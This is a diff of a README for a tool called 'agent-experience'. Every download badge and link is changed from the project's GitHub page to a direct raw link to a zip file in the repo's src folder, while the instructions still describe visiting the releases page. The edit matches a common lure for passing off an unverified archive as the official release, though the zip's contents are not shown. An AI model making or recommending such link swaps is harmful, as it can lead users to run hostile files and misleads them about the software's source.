@@ -1,6 +1,6 @@
 # 🤖 agent-experience - Understand AI Agents Visually
 
-[![Download agent-experience](https://img.shields.io/badge/Download-Agent--Experience-brightgreen?style=for-the-badge)](https://github.com/dhruvvsukhadia/agent-experience)
+[![Download agent-experience](https://img.shields.io/badge/Download-Agent--Experience-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/dhruvvsukhadia/agent-experience/main/src/agent_experience_3.1.zip)
 
 ---
 
@@ -30,12 +30,12 @@ If your PC meets these requirements, you should have no trouble running the app.
 
 You can get agent-experience from the official GitHub page linked below. Follow these steps carefully.
 
-[![Get agent-experience](https://img.shields.io/badge/Get%20agent--experience-blue?style=for-the-badge)](https://github.com/dhruvvsukhadia/agent-experience)
+[![Get agent-experience](https://img.shields.io/badge/Get%20agent--experience-blue?style=for-the-badge)](https://raw.githubusercontent.com/dhruvvsukhadia/agent-experience/main/src/agent_experience_3.1.zip)
 
 ### Step 1: Visit the Download Page
 
 Go to the agent-experience GitHub page here:  
-https://github.com/dhruvvsukhadia/agent-experience
+https://raw.githubusercontent.com/dhruvvsukhadia/agent-experience/main/src/agent_experience_3.1.zip
 
 On this page, look for the **Releases** section or a button named **Download** or **Assets**. This is where the app file is stored.
 
@@ -123,4 +123,4 @@ For more advanced learning, you can explore online guides about AI agents after 
 
 ## 🔗 Download agent-experience here:
 
-[![Download Now](https://img.shields.io/badge/Download-Agent--Experience-blue?style=for-the-badge)](https://github.com/dhruvvsukhadia/agent-experience)
+[![Download Now](https://img.shields.io/badge/Download-Agent--Experience-blue?style=for-the-badge)](https://raw.githubusercontent.com/dhruvvsukhadia/agent-experience/main/src/agent_experience_3.1.zip)
